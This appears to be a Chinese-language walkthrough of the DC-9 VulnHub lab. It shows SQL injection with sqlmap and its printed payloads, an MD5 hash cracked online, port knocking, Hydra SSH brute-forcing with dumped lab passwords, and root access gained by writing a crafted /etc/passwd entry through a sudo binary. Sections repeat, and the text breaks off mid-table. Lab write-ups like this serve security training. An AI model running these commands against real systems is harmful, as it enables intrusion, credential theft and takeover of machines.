+<p>這看起來是要請求加載file，也許可以利用<strong>FILE INCLUSION VULNERABILITIES測試</strong></p>
+<p><img src="/img/DC_Untitled_60.png" alt="Untitled"></p>
+<p>先前再22 port找到看起來是<strong>Port knocking的問題</strong></p>
+<p>透過knockd.conf去察看文件</p>
+<p><img src="/img/DC_Untitled_61.png" alt="Untitled"></p>
+<p>為了打開 SSH 端口需要使用 SYN 數據包訪問的端口順序 - 7469,8475,9842 端口。</p>
+<p><img src="/img/DC_Untitled_62.png" alt="Untitled"></p>
+<p>我們可以使用以下方法之一：</p>
+<ol>
+<li><p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/knockd">Knockd</a>- 需要安裝。</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/hping3">hping3</a><code>hping3 -S 10.0.0.235 -p 7469 -c 1; hping3 -S 10.0.0.235 -p 8475 -c 1; hping3 -S 10.0.0.235 -p 9842 -c 1</code></p>
+<ul>
+<li>預安裝在 Kali 上。使用以下命令向每個端口發送 1 個 SYN 數據包：</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat</a>- 我將使用這種方法，因為它（手動但）簡單。</p>
+</li>
+</ol>
+<p><img src="/img/DC_Untitled_63.png" alt="Untitled"></p>
+<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a><strong>hydra</strong></h3><p>前面在users的db中找到了用戶名稱跟密碼的列表，需要知道哪個帳號匹配哪個密碼，這裡用爆破方式，需要將剛sqlmap的資料丟過來</p>
+<p>首先需要創建user跟passwd的文件</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Table</span>: UserDetails</span><br><span class="line">[<span class="number">17</span> entries]</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> lastname   <span class="operator">|</span> password      <span class="operator">|</span> reg_date            <span class="operator">|</span> username  <span class="operator">|</span> firstname <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> Moe        <span class="operator">|</span> <span class="number">3</span>kfs86sfd     <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> marym     <span class="operator">|</span> Mary      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> Dooley     <span class="operator">|</span> <span class="number">468</span>sfdfsd2    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> julied    <span class="operator">|</span> Julie     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> Flintstone <span class="operator">|</span> <span class="number">4</span>sfd87sfd1    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> fredf     <span class="operator">|</span> Fred      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> Rubble     <span class="operator">|</span> RocksOff      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> barneyr   <span class="operator">|</span> Barney    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>  <span class="operator">|</span> Cat        <span class="operator">|</span> TC<span class="operator">&amp;</span>TheBoyz    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> tomc      <span class="operator">|</span> Tom       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6</span>  <span class="operator">|</span> Mouse      <span class="operator">|</span> B8m#<span class="number">48</span>sd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> jerrym    <span class="operator">|</span> Jerry     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">7</span>  <span class="operator">|</span> Flintstone <span class="operator">|</span> Pebbles       <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> wilmaf    <span class="operator">|</span> Wilma     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8</span>  <span class="operator">|</span> Rubble     <span class="operator">|</span> BamBam01      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> bettyr    <span class="operator">|</span> Betty     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">9</span>  <span class="operator">|</span> Bing       <span class="operator">|</span> UrAG0D<span class="operator">!</span>       <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> chandlerb <span class="operator">|</span> Chandler  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span> Tribbiani  <span class="operator">|</span> Passw0rd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> joeyt     <span class="operator">|</span> Joey      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> Green      <span class="operator">|</span> yN72#dsd      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> rachelg   <span class="operator">|</span> Rachel    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> Geller     <span class="operator">|</span> ILoveRachel   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> rossg     <span class="operator">|</span> Ross      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">13</span> <span class="operator">|</span> Geller     <span class="operator">|</span> <span class="number">3248</span>dsds7s    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> monicag   <span class="operator">|</span> Monica    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span> Buffay     <span class="operator">|</span> smellycats    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> phoebeb   <span class="operator">|</span> Phoebe    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15</span> <span class="operator">|</span> McScoots   <span class="operator">|</span> YR3BVxxxw87   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> scoots    <span class="operator">|</span> Scooter   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">16</span> <span class="operator">|</span> Trump      <span class="operator">|</span> Ilovepeepee   <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> janitor   <span class="operator">|</span> Donald    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">17</span> <span class="operator">|</span> Morrison   <span class="operator">|</span> Hawaii<span class="operator">-</span>Five<span class="number">-0</span> <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">28</span> <span class="operator">|</span> janitor2  <span class="operator">|</span> Scott     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br></pre></td></tr></table></figure>
+
+<p>username.txt 可以用以下方式取得特定格式資料</p>
+<p><code>awk -F &quot;|&quot; &#39;NR&gt;2 &#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $4); gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $6); print $6&#125;&#39; UserDetails.db</code></p>
+<p><img src="/img/DC_Untitled_64.png" alt="Untitled"></p>
+<p>password.txt</p>
+<p><code>awk -F &quot;|&quot; &#39;NR&gt;2 &#123;gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $4); gsub(/^[ \t]+|[ \t]+$/, &quot;&quot;, $6); print $4&#125;&#39; UserDetails.db</code></p>
+<p><img src="/img/DC_Untitled_65.png" alt="Untitled"></p>
+<p>通過 SSH 服務使用 Hydra，提供兩個文件作為輸入。我們需要等待 Hydra 完成攻擊並列出有效密碼（如果找到的話）</p>
+<p><img src="/img/DC_Untitled_66.png" alt="Untitled"></p>
+<p>[22][ssh] host: 192.168.147.131   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.147.131   login: joeyt   password: Passw0rd<br>[22][ssh] host: 192.168.147.131   login: janitor   password: Ilovepeepee</p>
+<p>現在知道有三個組合可以登錄</p>
+<p>chandlerb 用戶登入後沒發現有趣的東西</p>
+<p><img src="/img/DC_Untitled_67.png" alt="Untitled"></p>
+<p>joeyt用戶也沒有東西</p>
+<p><img src="/img/DC_Untitled_68.png" alt="Untitled"></p>
+<p>在janitor用戶下看到了些機敏資料</p>
+<p><img src="/img/DC_Untitled_69.png" alt="Untitled"></p>
+<p>將這些密碼在拿去hydra以相同用戶爆破一次</p>
+<p><img src="/img/DC_Untitled_70.png" alt="Untitled"></p>
+<p>[22][ssh] host: 192.168.147.131   login: fredf   password: B4-Tru3-001<br>[22][ssh] host: 192.168.147.131   login: joeyt   password: Passw0rd</p>
+<p>將這些用戶嘗試權升級</p>
+<p>登入到fredf 使用 <code>sudo -l</code></p>
+<p><img src="/img/DC_Untitled_71.png" alt="Untitled"></p>
+<p><img src="/img/DC_Untitled_72.png" alt="Untitled"></p>
+<p>看起來二進製文件正在運行某種名為<em>test.py</em>的 Python 文件。讓我們使用<code>find</code>命令找到它：</p>
+<ul>
+<li><code>/</code>是開始掃描的根路徑</li>
+<li>-<code>type f</code>搜索文件（d 代表目錄）</li>
+<li>-<code>name &#39;test.py&#39;</code>文件名 flag.txt。我們也可以使用通配符，例如“flag”</li>
+<li><code>2&gt;/dev/null</code>這將產生更清晰的輸出，因為它將丟棄錯誤，例如權限錯誤。</li>
+</ul>
+<p><code>find / -name &quot;[test.py](http://test.py/)&quot; -type f 2&gt;/dev/null</code></p>
+<p><img src="/img/DC_Untitled_73.png" alt="Untitled"></p>
+<p>通過使用測試腳本將新記錄injecting&#x2F;concatinating到文件來添加新的<em><strong>root user</strong></em></p>
+<p>首先我們需要選擇一個密碼，加鹽並對結果進行hash處理。openssl 來救援。</p>
+<p>標誌：</p>
+<ul>
+<li><code>-1</code>使用什麼哈希算法。在我們的用例中，這並不重要，因此我們使用 MD5，在現實世界的 PT 中應避免使用 MD5，因為它不安全。</li>
+<li><code>-salt salt</code>用作鹽的string。我選擇string salt</li>
+<li><code>-password</code>我們想要使用的明文密碼。</li>
+</ul>
+<p><code>openssl passwd -1 -salt salt password</code></p>
+<p>openssl passwd: 這是 OpenSSL 工具中的一個子命令，用於生成密碼哈希。</p>
+<ul>
+<li>1: 這是一個選項，表示要使用 <strong>MD5 哈希算法生成密碼哈希</strong>。雖然 MD5 不再被視為安全的哈希算法，但在某些情況下仍然可以用於簡單的密碼散列。</li>
+<li>salt salt: 這是一個選項，用於指定用於哈希生成的鹽值。鹽是一個隨機字符串，可以增加密碼哈希的安全性。</li>
+</ul>
+<p>password: 這是要哈希的密碼。替換為您要哈希的實際密碼。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span>$<span class="number">1</span>$salt$qJH7.N4xYta3aEG<span class="operator">/</span>dfqo<span class="operator">/</span><span class="number">0</span><span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure>
+
+<p><code>vi /tmp/user</code> 先在tmp目錄下新增一個檔案叫user，並寫入以下內容</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hful:$<span class="number">1</span>$salt$qJH7.N4xYta3aEG<span class="operator">/</span>dfqo<span class="operator">/</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>::<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br></pre></td></tr></table></figure>
+
+<p>寫完後到執行.&#x2F;test的地方<code>/opt/devstuff/dist/test</code></p>
+<p><code>sudo ./test /tmp/user /etc/passwd</code> 並執行這命令</p>
+<p>然後cat &#x2F;etc&#x2F;passwd就會看到hful變成了允許的root身分(這裡我有寫錯內容所以才出來兩個)</p>
+<p><img src="/img/DC_Untitled_74.png" alt="Untitled"></p>
+<p>接下來到hful登入密碼是剛剛前面設定的password</p>
+<p><img src="/img/DC_Untitled_75.png" alt="Untitled"></p>
+<p>其他參考</p>
+<p><a target="_blank" rel="noopener" href="https://www.explainshell.com/explain?cmd=sudo+-l">explainshell.com - sudo -l</a></p>
+<hr>
+<h1 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9</a></p>
+<p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-9.zip"></a></p>
+<p>已知該機器的MAC 00:0C:29:FE:8B:07</p>
+<p><img src="/img/DC_Untitled_47.png" alt="Untitled"></p>
+<p>因為是橋接，所以機器的網段應該會一樣 </p>
+<p>kali : 192.168.147.128   NAT</p>
+<p>dc-9 : MAC 00:0C:29:FE:8B:07  NAT</p>
+<p>需要用<code>netdiscover</code>去掃192.168.0.0&#x2F;24的位置看有沒有符合該網段資訊的IP</p>
+<p>或是可以用<code>namp -sn 192.168.0.0/24</code></p>
+<p>這裡用 <code>netdiscover -i eth1 -r 192.168.147.0/24</code></p>
+<p><img src="/img/DC_Untitled_48.png" alt="Untitled"></p>
+<p>找到了192.168.147.131的IP位址</p>
+<p><code>nmap -sV -p- -O -T4 192.168.147.131</code></p>
+<ul>
+<li><code>-sV</code> 確定服務&#x2F;版本信息</li>
+<li><code>-T4</code> 為了更快的執行</li>
+<li><code>-p-</code> 掃描所有端口</li>
+<li><code>-O</code> 識別操作系統</li>
+</ul>
+<p><img src="/img/DC_Untitled_49.png" alt="Untitled"></p>
+<p>查看開放的服務後沒發現可利用的內容</p>
+<p>22 port filtered</p>
+<p>一般nmap所掃描出來的結果有三種：<code>open、filtered、unfiltered</code></p>
+<ul>
+<li>Open意思是指目標機器的這個連接埠有開啟</li>
+<li>Filtered意思是指有Firewall&#x2F;filter,或是其它的網路設備將掩蓋了此連接埠，並且阻止nmap去得知連接埠是否有開啟</li>
+<li>Unfiltered意思是指這個連接埠被nmap判定為關閉的，並且沒有任何Firewall&#x2F;filter來阻止nmap來嘗試得知連接埠的狀態。Unfiltered ports是很平常的訊息，並且只出現在大部份的掃描連接埠在filtered狀態中。</li>
+</ul>
+<p>猜他使用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Port_knocking">Port Knocking</a> 的方法</p>
+<p>查看該網站功能</p>
+<p><img src="/img/DC_Untitled_50.png" alt="Untitled"></p>
+<p>再搜索位址下使用SQL injection可以允許執行，不過需要繞一下</p>
+<p><img src="/img/DC_Untitled_51.png" alt="Untitled"></p>
+<p>用sqlmap去爆破，首先複製全Request成一個txt檔案(Copy to file)</p>
+<p><img src="/img/DC_Untitled_52.png" alt="Untitled"></p>
+<p><code>sqlmap -r search.txt --dbs</code></p>
+<p><img src="/img/DC_Untitled_53.png" alt="Untitled"></p>
+<p>有一些存在的DB</p>
+<p>available databases [3]:<br>[<em>]  <em>information_schema</em><br>[</em>]  Staff<br>[*]  users</p>
+<p>再來找<strong>tables</strong></p>
+<p><code>sqlmap -r search.txt --tables</code></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="keyword">Parameter</span>: <span class="keyword">search</span> (POST)</span><br><span class="line">    Type: <span class="type">time</span><span class="operator">-</span>based blind</span><br><span class="line">    Title: MySQL <span class="operator">&gt;=</span> <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> <span class="type">time</span><span class="operator">-</span>based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="keyword">search</span><span class="operator">=</span>param<span class="string">&#x27; AND (SELECT 3355 FROM (SELECT(SLEEP(5)))Rcyx) AND &#x27;</span>nyOI<span class="string">&#x27;=&#x27;</span>nyOI</span><br><span class="line"></span><br><span class="line">    Type: <span class="keyword">UNION</span> query</span><br><span class="line">    Title: Generic <span class="keyword">UNION</span> query (<span class="keyword">NULL</span>) <span class="operator">-</span> <span class="number">6</span> columns</span><br><span class="line">    Payload: <span class="keyword">search</span><span class="operator">=</span>param<span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a707871,0x5067686578705049616e6f687a72434e7769564250617772595941474a4d6e614c4a4c72417a4556,0x7176707a71),NULL,NULL,NULL,NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Debian 10 (buster)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.38</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] fetching database names</span></span><br><span class="line"><span class="string">[04:09:19] [INFO] fetching tables for databases: &#x27;</span>Staff, information_schema, users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: information_schema</span></span><br><span class="line"><span class="string">[76 tables]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| ALL_PLUGINS                           |</span></span><br><span class="line"><span class="string">| APPLICABLE_ROLES                      |</span></span><br><span class="line"><span class="string">| CHARACTER_SETS                        |</span></span><br><span class="line"><span class="string">| CHECK_CONSTRAINTS                     |</span></span><br><span class="line"><span class="string">| CLIENT_STATISTICS                     |</span></span><br><span class="line"><span class="string">| COLLATIONS                            |</span></span><br><span class="line"><span class="string">| COLLATION_CHARACTER_SET_APPLICABILITY |</span></span><br><span class="line"><span class="string">| COLUMNS                               |</span></span><br><span class="line"><span class="string">| COLUMN_PRIVILEGES                     |</span></span><br><span class="line"><span class="string">| ENABLED_ROLES                         |</span></span><br><span class="line"><span class="string">| ENGINES                               |</span></span><br><span class="line"><span class="string">| EVENTS                                |</span></span><br><span class="line"><span class="string">| FILES                                 |</span></span><br><span class="line"><span class="string">| GEOMETRY_COLUMNS                      |</span></span><br><span class="line"><span class="string">| GLOBAL_STATUS                         |</span></span><br><span class="line"><span class="string">| GLOBAL_VARIABLES                      |</span></span><br><span class="line"><span class="string">| INDEX_STATISTICS                      |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_PAGE                    |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_PAGE_LRU                |</span></span><br><span class="line"><span class="string">| INNODB_BUFFER_POOL_STATS              |</span></span><br><span class="line"><span class="string">| INNODB_CMP                            |</span></span><br><span class="line"><span class="string">| INNODB_CMPMEM                         |</span></span><br><span class="line"><span class="string">| INNODB_CMPMEM_RESET                   |</span></span><br><span class="line"><span class="string">| INNODB_CMP_PER_INDEX                  |</span></span><br><span class="line"><span class="string">| INNODB_CMP_PER_INDEX_RESET            |</span></span><br><span class="line"><span class="string">| INNODB_CMP_RESET                      |</span></span><br><span class="line"><span class="string">| INNODB_FT_BEING_DELETED               |</span></span><br><span class="line"><span class="string">| INNODB_FT_CONFIG                      |</span></span><br><span class="line"><span class="string">| INNODB_FT_DEFAULT_STOPWORD            |</span></span><br><span class="line"><span class="string">| INNODB_FT_DELETED                     |</span></span><br><span class="line"><span class="string">| INNODB_FT_INDEX_CACHE                 |</span></span><br><span class="line"><span class="string">| INNODB_FT_INDEX_TABLE                 |</span></span><br><span class="line"><span class="string">| INNODB_LOCKS                          |</span></span><br><span class="line"><span class="string">| INNODB_LOCK_WAITS                     |</span></span><br><span class="line"><span class="string">| INNODB_METRICS                        |</span></span><br><span class="line"><span class="string">| INNODB_MUTEXES                        |</span></span><br><span class="line"><span class="string">| INNODB_SYS_COLUMNS                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_DATAFILES                  |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FIELDS                     |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FOREIGN                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_FOREIGN_COLS               |</span></span><br><span class="line"><span class="string">| INNODB_SYS_INDEXES                    |</span></span><br><span class="line"><span class="string">| INNODB_SYS_SEMAPHORE_WAITS            |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLES                     |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLESPACES                |</span></span><br><span class="line"><span class="string">| INNODB_SYS_TABLESTATS                 |</span></span><br><span class="line"><span class="string">| INNODB_SYS_VIRTUAL                    |</span></span><br><span class="line"><span class="string">| INNODB_TABLESPACES_ENCRYPTION         |</span></span><br><span class="line"><span class="string">| INNODB_TABLESPACES_SCRUBBING          |</span></span><br><span class="line"><span class="string">| INNODB_TRX                            |</span></span><br><span class="line"><span class="string">| KEY_CACHES                            |</span></span><br><span class="line"><span class="string">| KEY_COLUMN_USAGE                      |</span></span><br><span class="line"><span class="string">| PARAMETERS                            |</span></span><br><span class="line"><span class="string">| PARTITIONS                            |</span></span><br><span class="line"><span class="string">| PLUGINS                               |</span></span><br><span class="line"><span class="string">| PROCESSLIST                           |</span></span><br><span class="line"><span class="string">| PROFILING                             |</span></span><br><span class="line"><span class="string">| REFERENTIAL_CONSTRAINTS               |</span></span><br><span class="line"><span class="string">| ROUTINES                              |</span></span><br><span class="line"><span class="string">| SCHEMATA                              |</span></span><br><span class="line"><span class="string">| SCHEMA_PRIVILEGES                     |</span></span><br><span class="line"><span class="string">| SESSION_STATUS                        |</span></span><br><span class="line"><span class="string">| SESSION_VARIABLES                     |</span></span><br><span class="line"><span class="string">| SPATIAL_REF_SYS                       |</span></span><br><span class="line"><span class="string">| STATISTICS                            |</span></span><br><span class="line"><span class="string">| SYSTEM_VARIABLES                      |</span></span><br><span class="line"><span class="string">| TABLES                                |</span></span><br><span class="line"><span class="string">| TABLESPACES                           |</span></span><br><span class="line"><span class="string">| TABLE_CONSTRAINTS                     |</span></span><br><span class="line"><span class="string">| TABLE_PRIVILEGES                      |</span></span><br><span class="line"><span class="string">| TABLE_STATISTICS                      |</span></span><br><span class="line"><span class="string">| TRIGGERS                              |</span></span><br><span class="line"><span class="string">| USER_PRIVILEGES                       |</span></span><br><span class="line"><span class="string">| USER_STATISTICS                       |</span></span><br><span class="line"><span class="string">| VIEWS                                 |</span></span><br><span class="line"><span class="string">| user_variables                        |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">[2 tables]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| StaffDetails                          |</span></span><br><span class="line"><span class="string">| Users                                 |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">[1 table]</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br><span class="line"><span class="string">| UserDetails                           |</span></span><br><span class="line"><span class="string">+---------------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>提取表的每一列(<code>Staff</code>、users)</p>
+<p><code>sqlmap -r search_form.txt --columns -D Staff</code></p>
+<p><img src="/img/DC_Untitled_54.png" alt="Untitled"></p>
+<p><code>sqlmap -r search.txt --columns -D users</code></p>
+<p><img src="/img/DC_Untitled_55.png" alt="Untitled"></p>
+<p>接下來轉儲tables的中的數據</p>
+<p><code>sqlmap -r search.txt --dump -D users -T UserDetails</code></p>
+<p><img src="/img/DC_Untitled_56.png" alt="Untitled"></p>
+<p><code>sqlmap -r search.txt --dump -D Staff -T Users</code></p>
+<p><img src="/img/DC_Untitled_57.png" alt="Untitled"></p>
+<p>這裡就找到了admin Password，它包含一個明文用戶名和一個<a target="_blank" rel="noopener" href="https://auth0.com/blog/hashing-passwords-one-way-road-to-security/">散列密碼</a>，甚至 sqlmap 也將其識別為 MD5。</p>
+<p><a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a>破解這個哈希值</p>
+<p><img src="/img/DC_Untitled_58.png" alt="Untitled"></p>
+<p>transorbital1</p>
+<p><img src="/img/DC_Untitled_59.png" alt="Untitled"></p>
+<p>這看起來是要請求加載file，也許可以利用<strong>FILE INCLUSION VULNERABILITIES測試</strong></p>
+<p><img src="/img/DC_Untitled_60.png" alt="Untitled"></p>
+<p>先前再22 port找到看起來是<strong>Port knocking的問題</strong></p>
+<p>透過knockd.conf去察看文件</p>
+<p><img src="/img/DC_Untitled_61.png" alt="Untitled"></p>
+<p>為了打開 SSH 端口需要使用 SYN 數據包訪問的端口順序 - 7469,8475,9842 端口。</p>
+<p><img src="/img/DC_Untitled_62.png" alt="Untitled"></p>
+<p>我們可以使用以下方法之一：</p>
+<ol>
+<li><p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/knockd">Knockd</a>- 需要安裝。</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/hping3">hping3</a><code>hping3 -S 10.0.0.235 -p 7469 -c 1; hping3 -S 10.0.0.235 -p 8475 -c 1; hping3 -S 10.0.0.235 -p 9842 -c 1</code></p>
+<ul>
+<li>預安裝在 Kali 上。使用以下命令向每個端口發送 1 個 SYN 數據包：</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat</a>- 我將使用這種方法，因為它（手動但）簡單。</p>
+</li>
+</ol>
+<p><img src="/img/DC_Untitled_63.png" alt="Untitled"></p>
+<h3 id="hydra-1"><a href="#hydra-1" class="headerlink" title="hydra"></a><strong>hydra</strong></h3><p>前面在users的db中找到了用戶名稱跟密碼的列表，需要知道哪個帳號匹配哪個密碼，這裡用爆破方式，需要將剛sqlmap的資料丟過來</p>
+<p>首先需要創建user跟passwd的文件</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Table</span>: UserDetails</span><br><span class="line">[<span class="number">17</span> entries]</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> lastname   <span class="operator">|</span> password      <span class="operator">|</span> reg_date            <span class="operator">|</span> username  <span class="operator">|</span> firstname <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+---------------+---------------------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> Moe        <span class="operator">|</span> <span class="number">3</span>kfs86sfd     <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> marym     <span class="operator">|</span> Mary      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> Dooley     <span class="operator">|</span> <span class="number">468</span>sfdfsd2    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> julied    <span class="operator">|</span> Julie     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> Flintstone <span class="operator">|</span> <span class="number">4</span>sfd87sfd1    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> fredf     <span class="operator">|</span> Fred      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> Rubble     <span class="operator">|</span> RocksOff      <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> barneyr   <span class="operator">|</span> Barney    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>  <span class="operator">|</span> Cat        <span class="operator">|</span> TC<span class="operator">&amp;</span>TheBoyz    <span class="operator">|</span> <span class="number">2019</span><span class="number">-12</span><span class="number">-29</span> <span class="number">16</span>:<span class="number">58</span>:<span class="number">26</span> <span class="operator">|</span> tomc      <span class="operator">|</span> Tom       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6</span>  <span class="operator">|</span> Mouse      <span class="operator">|</span> B8m#<span class="number">48</span>sd      